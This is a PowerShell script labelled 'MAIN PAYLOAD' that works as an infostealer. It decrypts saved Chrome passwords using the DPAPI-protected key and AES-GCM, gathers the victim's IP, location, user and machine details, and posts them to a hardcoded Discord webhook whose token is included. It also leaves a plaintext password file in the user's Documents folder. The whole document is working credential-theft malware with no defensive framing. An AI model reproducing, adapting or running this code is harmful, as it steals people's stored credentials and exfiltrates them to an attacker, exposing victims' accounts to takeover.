# MAIN PAYLOAD - System Info + Proper Chrome Password Extraction

Write-Host "================================" -ForegroundColor Cyan
Write-Host "Data Collection Script" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

Add-Type -AssemblyName System.Security

# Function to download and load SQLite
function Load-SQLite {
    $sqlitePath = "$env:TEMP\System.Data.SQLite.dll"
    
    if (-not (Test-Path $sqlitePath)) {
        Write-Host "      Downloading SQLite..." -ForegroundColor Yellow
        try {
            # Download SQLite DLL from NuGet
            $url = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.118"
            $zipPath = "$env:TEMP\sqlite.zip"
            
            Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
            
            # Extract the DLL
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            
            # Find the correct DLL for architecture
            $arch = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
            $dllEntry = $zip.Entries | Where-Object { $_.FullName -like "lib/net46/System.Data.SQLite.dll" } | Select-Object -First 1
            
            if ($dllEntry) {
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($dllEntry, $sqlitePath, $true)
            }
            
            $zip.Dispose()
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
            
            Write-Host "      SQLite downloaded!" -ForegroundColor Green
        } catch {
            Write-Host "      Failed to download SQLite: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
    
    # Load the assembly
    try {
        [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
        return $true
    } catch {
        Write-Host "      Failed to load SQLite: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}
function Get-ChromeEncryptionKey {
    $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
    
    if (-not (Test-Path $localStatePath)) {
        return $null
    }
    
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        
        # Remove "DPAPI" prefix (first 5 bytes)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
        
        # Decrypt using DPAPI
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $decryptedKey
    } catch {
        Write-Host "      Failed to get encryption key: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# Function to decrypt Chrome password using AES-GCM
function Decrypt-ChromePassword {
    param(
        [byte[]]$EncryptedPassword,
        [byte[]]$Key
    )
    
    try {
        # Extract IV (initialization vector) - first 12 bytes after version
        $iv = $EncryptedPassword[3..14]
        
        # Extract encrypted data (skip version + IV)
        $encryptedData = $EncryptedPassword[15..($EncryptedPassword.Length - 17)]
        
        # Extract auth tag (last 16 bytes)
        $authTag = $EncryptedPassword[($EncryptedPassword.Length - 16)..($EncryptedPassword.Length - 1)]
        
        # Decrypt using AES-GCM
        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
        $decrypted = New-Object byte[] $encryptedData.Length
        
        $aes.Decrypt($iv, $encryptedData, $authTag, $decrypted)
        
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        # Try old DPAPI method (pre Chrome 80)
        try {
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $EncryptedPassword,
                $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        } catch {
            return "Failed to decrypt"
        }
    }
}

# Function to extract Chrome passwords without external dependencies
function Get-ChromePasswords {
    $passwords = @()
    
    # Get encryption key
    $key = Get-ChromeEncryptionKey
    if (-not $key) {
        Write-Host "      Could not get Chrome encryption key" -ForegroundColor Yellow
        return $passwords
    }
    
    # Copy Login Data database
    $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    
    if (-not (Test-Path $dbPath)) {
        Write-Host "      Chrome Login Data not found" -ForegroundColor Yellow
        return $passwords
    }
    
    $tempDB = "$env:TEMP\ChromeData_$(Get-Random).db"
    
    try {
        Copy-Item $dbPath $tempDB -Force
    } catch {
        Write-Host "      Chrome database locked (browser running)" -ForegroundColor Yellow
        return $passwords
    }
    
    # Use PSSQLite module (download if needed)
    try {
        # Check if PSSQLite is installed
        if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
            Write-Host "      Installing PSSQLite module..." -ForegroundColor Yellow
            Install-Module -Name PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck -ErrorAction Stop
        }
        
        Import-Module PSSQLite -ErrorAction Stop
        
        # Query the database
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE LENGTH(password_value) > 0 ORDER BY date_last_used DESC LIMIT 50"
        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query
        
        foreach ($row in $results) {
            $url = $row.origin_url
            $username = $row.username_value
            $encryptedPassword = [byte[]]$row.password_value
            
            if ($encryptedPassword -and $encryptedPassword.Length -gt 0) {
                $password = Decrypt-ChromePassword -EncryptedPassword $encryptedPassword -Key $key
                
                if ($password -ne "Failed to decrypt") {
                    $passwords += @{
                        URL = $url
                        Username = $username
                        Password = $password
                    }
                }
            }
        }
        
        Write-Host "      Successfully extracted $($passwords.Count) passwords" -ForegroundColor Green
        
    } catch {
        Write-Host "      PSSQLite unavailable, using fallback method" -ForegroundColor Yellow
        
        # Fallback: Parse SQLite database manually (basic extraction)
        try {
            $bytes = [System.IO.File]::ReadAllBytes($tempDB)
            
            # Look for URL patterns in raw data
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            $urlPattern = 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s"]*'
            $urls = [regex]::Matches($text, $urlPattern) | ForEach-Object { $_.Value } | Select-Object -Unique | Where-Object { $_ -notmatch 'google|chrome|gstatic|googleapis' }
            
            $passwords += @{
                URL = "Database found with $($urls.Count) potential entries"
                Username = ""
                Password = "Manual extraction required - close Chrome and try again"
            }
        } catch {}
    }
    
    Remove-Item $tempDB -Force -ErrorAction SilentlyContinue
    return $passwords
}

# Get public IP and location
Write-Host "`n[1/4] Fetching public IP and location..." -ForegroundColor Yellow
try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $city = $ipInfo.city
    $region = $ipInfo.regionName
    Write-Host "      IP: $ip" -ForegroundColor Green
    Write-Host "      Location: $city, $region, $country" -ForegroundColor Green
} catch {
    $ip = "Unable to fetch"
    $country = "Unknown"
    $city = "Unknown"
    $region = "Unknown"
}

# Get system info
Write-Host "`n[2/4] Getting system info..." -ForegroundColor Yellow
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$computer = $env:COMPUTERNAME
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "      Computer: $computer" -ForegroundColor Green
Write-Host "      User: $user" -ForegroundColor Green

# Extract Chrome passwords
Write-Host "`n[3/4] Extracting Chrome passwords..." -ForegroundColor Yellow
$allPasswords = Get-ChromePasswords

if ($allPasswords.Count -gt 0) {
    Write-Host "      Found $($allPasswords.Count) password entries!" -ForegroundColor Green
} else {
    Write-Host "      No passwords extracted" -ForegroundColor Yellow
}

# Format passwords for Discord (limit to prevent message too long)
$passwordText = ""
$displayCount = [Math]::Min($allPasswords.Count, 20)  # Show max 20 in Discord

for ($i = 0; $i -lt $displayCount; $i++) {
    $entry = $allPasswords[$i]
    $passwordText += "`n**$($entry.URL)**`nUser: ``$($entry.Username)```nPass: ``$($entry.Password)```n"
}

if ($allPasswords.Count -gt 20) {
    $passwordText += "`n... and $($allPasswords.Count - 20) more (see local file)"
}

if (-not $passwordText) {
    $passwordText = "`nNo passwords found or Chrome not installed"
}

# Compose Discord message
$message = @"
**🚨 New Connection**
:clock1: **Time:** $time
:computer: **Computer:** $computer
:bust_in_silhouette: **User:** $user
:desktop: **OS:** $os
:globe_with_meridians: **IP:** $ip
:flag_$($country.ToLower().Substring(0,2).Replace(' ','')): **Location:** $city, $region, $country

**🔐 Chrome Passwords ($($allPasswords.Count) found):**$passwordText
"@

# Discord webhook
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

Write-Host "`n[4/4] Sending to Discord..." -ForegroundColor Yellow

# Split if too long
if ($message.Length -gt 1900) {
    $message = $message.Substring(0, 1900) + "`n... (truncated)"
}

$payload = @{ content = $message } | ConvertTo-Json

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Write-Host "`n================================" -ForegroundColor Green
    Write-Host "SUCCESS! Data sent to Discord!" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Green
} catch {
    Write-Host "`n================================" -ForegroundColor Red
    Write-Host "FAILED TO SEND!" -ForegroundColor Red
    Write-Host "================================" -ForegroundColor Red
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}

# Save full output locally
Write-Host "`nSaving backup locally..." -ForegroundColor Yellow
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "chrome_passwords.txt"
"Chrome Password Extraction Report" | Out-File $out -Encoding UTF8
"Generated: $time" | Out-File $out -Append -Encoding UTF8
"Total Passwords: $($allPasswords.Count)" | Out-File $out -Append -Encoding UTF8
"=" * 50 | Out-File $out -Append -Encoding UTF8
$allPasswords | Format-List | Out-File $out -Append -Encoding UTF8
Write-Host "Full password list saved to: $out" -ForegroundColor Green

Write-Host "`n================================" -ForegroundColor Cyan
Read-Host "Press Enter to close"
